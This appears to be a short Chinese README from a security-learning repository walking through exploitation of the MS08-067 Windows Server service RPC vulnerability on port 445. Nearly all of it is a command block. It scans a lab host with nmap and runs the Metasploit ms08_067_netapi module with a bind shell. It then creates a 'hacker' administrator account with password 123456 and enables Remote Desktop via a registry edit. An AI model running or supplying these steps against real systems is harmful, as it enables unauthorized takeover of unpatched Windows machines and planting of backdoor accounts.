# MS08-067-RPC
该资源是MS08-067远程代码执行漏洞，它是Windows Server服务RPC请求缓冲区溢出漏洞，利用445端口，并通过Metasploit工具获取shell及进行深入的操作。


参考文章：<br />



核心命令：

<br />

```shell
# 端口查询
nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open

# 查找漏洞利用模块
msfconsole
search ms08-067

# 漏洞利用
use exploit/windows/smb/ms08_067_netapi
show options
show targets

# 设置相关配置信息
set RHOST 192.168.44.135
set RPORT 445
set payload generic/shell_bind_tcp
set LHOST 192.168.44.136
set target 0
show options

# 反弹shell
exploit
session 1
ipconfig
pwd

# 目标主机文件操作
cd ..
mkdir hacker
dir
cd hacker
echo eastmount>test.txt
sysinfo

# 深度提权及远程连接操作
net user hacker 123456 /add 
net localgroup administrators hacker /add
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f > C:\WINDOWS\system32\3389.bat && call 3389.bat
netstat -an
rdesktop 192.168.44.135
```



